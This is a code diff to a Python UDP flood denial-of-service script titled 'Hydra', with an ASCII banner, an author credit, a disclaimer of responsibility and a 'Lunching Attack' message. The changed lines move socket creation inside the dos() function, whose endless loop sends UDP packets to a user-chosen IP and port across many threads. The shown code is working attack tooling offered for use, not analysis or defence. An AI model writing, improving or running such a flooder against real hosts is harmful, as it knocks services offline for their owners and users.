@@ -2,8 +2,6 @@ import random
 import socket
 import time
 import threading as th
-connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
 Hydra = """\33[91m\33[47m
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0KWW00MMMMMMMMMMMMMM
 MMMWKKNWNXXWMMWNNWMMMMMWNKK0kdooc;cOxo0MMMMMMMMMMMMM
@@ -41,7 +39,7 @@ Created By: HerobrinePE
 Channel: \33[4m https://www.youtube.com/c/HerobrinePE\33[0m\33[91m
 \33[40m\33[92m
 Using Too much Bytes can slow down internet speed depending on your internet connection
-\33[41m Multi\33[0m\33[92m Threading can also make it slow
+\33[41m Multi\33[0m\33[92m Threading can also make it slow 
 
 **\33[1mI Am Not Responsible For Any Of Your Actions\33[0m\33[32m**
 =======================================
@@ -61,11 +59,11 @@ print ("\33[91m \33[104m  Lunching Attack on "+str(ip)+" Port="+ str(port)+ " Th
 def dos():
     sent = 0
     while True:
+        	connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         	connect.sendto(bytes, (ip, port))
         	sent = sent+1
         	print("\r\33[42m Bytes="+str(sent), sep="",end='\33[0m', flush=True)        	
         	
-
 for i in range(int(num)):
 	time.sleep(tme)
 	print("\r\33[42m				Threads Activated="+str(i+1), end="\33[0m ", flush=True)
